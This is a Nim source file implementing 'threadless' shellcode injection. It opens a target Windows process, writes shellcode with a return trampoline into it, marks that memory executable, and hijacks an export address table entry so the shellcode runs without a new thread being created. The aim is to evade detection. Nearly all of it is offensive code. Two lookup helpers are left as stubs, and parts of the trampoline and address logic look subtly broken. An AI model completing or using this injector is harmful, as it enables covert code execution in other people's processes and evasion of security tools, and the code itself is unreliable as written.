# threadless_inject.nim — Threadless shellcode injection via EAT hijack
#
# No CreateThread / NtCreateThreadEx.
# Technique: allocate RW in target, write shellcode, flip to RX, hijack EAT entry.

import winim

proc remoteAllocRw(hProc: HANDLE, size: int): uint =
  # unsafe
  let p = VirtualAllocEx(hProc, nil, SIZE_T(size),
                         MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  cast[uint](p)

proc remoteProtectRx(hProc: HANDLE, `addr`: uint, size: int) =
  # unsafe
  var old: DWORD = 0
  discard VirtualProtectEx(hProc, cast[LPVOID](`addr`), SIZE_T(size),
                            PAGE_EXECUTE_READ, addr old)

proc remoteModuleBase(hProc: HANDLE, dllName: string): uint =
  # stub — implement via ReadProcessMemory + PEB walk
  discard (hProc, dllName)
  0

proc remoteEatLookup(hProc: HANDLE, dllBase: uint,
                      exportName: string): (uint32, uint) =
  # stub — implement via ReadProcessMemory + EAT walk
  discard (hProc, dllBase, exportName)
  (0'u32, 0'u)

proc threadlessInject*(
  targetPid:  uint32,
  dllName:    string,
  exportName: string,
  shellcode:  seq[byte],
): bool =
  # unsafe
  let hProc = OpenProcess(DWORD(PROCESS_ALL_ACCESS), FALSE, targetPid)
  if cast[int](hProc) == 0: return false

  let dllBase = remoteModuleBase(hProc, dllName)
  if dllBase == 0:
    discard CloseHandle(hProc)
    return false

  let (funcRva, eatEntryVa) = remoteEatLookup(hProc, dllBase, exportName)
  let originalVa = dllBase + uint(funcRva)

  let alloc = remoteAllocRw(hProc, shellcode.len + 8 + 10)
  if alloc == 0:
    discard CloseHandle(hProc)
    return false

  # Build trampoline: shellcode || push rax; mov rax, originalVa; jmp rax
  var payload = shellcode
  payload.add([0x50'u8, 0x48'u8, 0xB8'u8])  # push rax; mov rax, imm64
  let vaBytes = cast[array[8, byte]](originalVa)
  for b in vaBytes: payload.add(b)
  payload.add([0xFF'u8, 0xE0'u8])  # jmp rax

  var written: SIZE_T = 0
  discard WriteProcessMemory(hProc, cast[LPVOID](alloc),
                              unsafeAddr payload[0],
                              SIZE_T(payload.len), addr written)

  remoteProtectRx(hProc, alloc, payload.len)

  # Overwrite EAT entry
  let newRva = uint32(alloc - dllBase)
  var bw: SIZE_T = 0
  discard WriteProcessMemory(hProc, cast[LPVOID](eatEntryVa),
                              unsafeAddr newRva, 4, addr bw)

  discard CloseHandle(hProc)
  true
